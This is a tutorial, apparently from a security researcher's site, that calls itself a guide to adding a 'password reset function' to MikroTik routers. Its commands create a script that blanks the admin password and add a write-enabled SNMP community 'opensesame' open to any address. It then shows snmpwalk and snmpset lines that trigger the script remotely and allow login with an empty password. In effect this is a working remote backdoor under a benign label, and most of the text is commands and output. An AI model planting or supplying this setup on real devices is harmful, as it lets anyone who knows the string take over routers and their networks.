### Tutorial: Adding a Password Reset Function to MikroTik OS

In this tutorial, we will add a password reset function to MikroTik OS using a MikroTik script. We will create a script called "password reset" that sets the admin password to an empty string. We will then enable SNMP write access with the community string "opensesame" and verify that the SNMP service is running. Finally, we will use `snmpwalk` to query the scripts and `snmpset` to run the password reset script over SNMP.

#### Step 1: Create the Password Reset Script

1. **Access the MikroTik CLI**:
   - You can access the MikroTik CLI via SSH, Telnet, or the Winbox terminal. For SSH, use a terminal application like PuTTY or the built-in terminal on your operating system.
   - Connect to your MikroTik router using its IP address and login credentials.

   ```sh
   ssh admin@<router_ip_address>
   ```

2. **Create the Script**:
   - Use the following command to create a new script named "password reset" that changes the password of the "admin" user to an empty password.

   ```sh
   /system script add name="password reset" source="/user set admin password=\"\""
   ```

3. **Verify the Script**:
   - Verify that the script has been created correctly by listing all scripts.

   ```sh
   /system script print
   ```

   Output:
   ```
   [admin@MikroTik] > /system script add name="password reset" source="/user set admin password=\"\""
   [admin@MikroTik] > /system script print
   Flags: I - invalid
    0   name="password reset" owner="admin" policy=ftp,reboot,read,write,policy,test,password,sniff,sensitive,romon
        dont-require-permissions=no run-count=0 source=/user set admin password=""
   ```

#### Step 2: Enable SNMP Write Access

1. **Enable SNMP**:
   - Enable the SNMP service on the router.

   ```sh
   /snmp set enabled=yes
   ```

2. **Configure SNMP Community**:
   - Add an SNMP community "opensesame" with write access.

   ```sh
   /snmp community add name=opensesame addresses=0.0.0.0/0 write-access=yes
   ```

3. **Verify SNMP Configuration**:
   - Verify that the SNMP service and community have been configured correctly.

   ```sh
   /snmp print
   /snmp community print
   ```

   Output:
   ```
   [admin@MikroTik] > /snmp print
            enabled: yes
            contact:
           location:
          engine-id:
        trap-target:
     trap-community: public
       trap-version: 1
     trap-generators: temp-exception
   [admin@MikroTik] > /snmp community print
   Flags: * - default, X - disabled
    #    NAME                ADDRESSES                                                 SECURITY   READ-ACCESS WRITE-ACCESS
    0 *  public              ::/0                                                      none       yes         no
    1    opensesame          0.0.0.0/0                                                 none       yes         yes
   ```

#### Step 3: Query Scripts Using SNMP

1. **Install SNMP Tools**:
   - Ensure that you have SNMP tools installed on your system. On Debian-based systems, you can install them using:

   ```sh
   sudo apt-get install snmp
   ```

2. **Use `snmpwalk` to Query Scripts**:
   - Use the `snmpwalk` command to query the OID `1.3.6.1.4.1.14988.1.1.8` to list the scripts.

   ```sh
   snmpwalk -v 2c -c opensesame <router_ip_address> 1.3.6.1.4.1.14988.1.1.8
   ```

   - This command will list the scripts available on the MikroTik router. Note that the MIB table
   entries may differ.

   Output:
   ```
   SNMPv2-SMI::enterprises.14988.1.1.8.1.1.2.1 = STRING: "password reset"
   SNMPv2-SMI::enterprises.14988.1.1.8.1.1.3.1 = INTEGER: 0
   ```

#### Step 4: Run the Script Using SNMP

1. **Use `snmpset` to Run the Script**:
   - Use the `snmpset` command to run the "password reset" script. Replace `<router_ip_address>` with the IP address of your MikroTik router.
   Ensure you are using the correct MIB table values for your script, from the snmpwalk command above. 

   ```sh
   snmpset -c opensesame -v2c 192.168.99.1 1.3.6.1.4.1.14988.1.1.8.1.1.3.1 i 1
   ```

   Output:

   ```
   SNMPv2-SMI::enterprises.14988.1.1.8.1.1.3.1 = INTEGER: 1
   ```

   - This command will execute the "password reset" script, setting the admin password to an empty string. 
   You can now authenticate to the router with `ssh admin@router_ip_address`.

### Summary

By following these steps, you can add a password reset function to MikroTik OS using a MikroTik script. You will also enable SNMP write access, verify the SNMP service, query the scripts using `snmpwalk`, and run the script using `snmpset`. This guide assumes you have administrative access to the router and are familiar with basic networking concepts. If you encounter any issues, refer to the MikroTik documentation or seek assistance from MikroTik support or community forums.

---

**Author**: Hacker Fantastic  
**Date**: April 17, 2025  
**Website**: [https://hacker.house](https://hacker.house)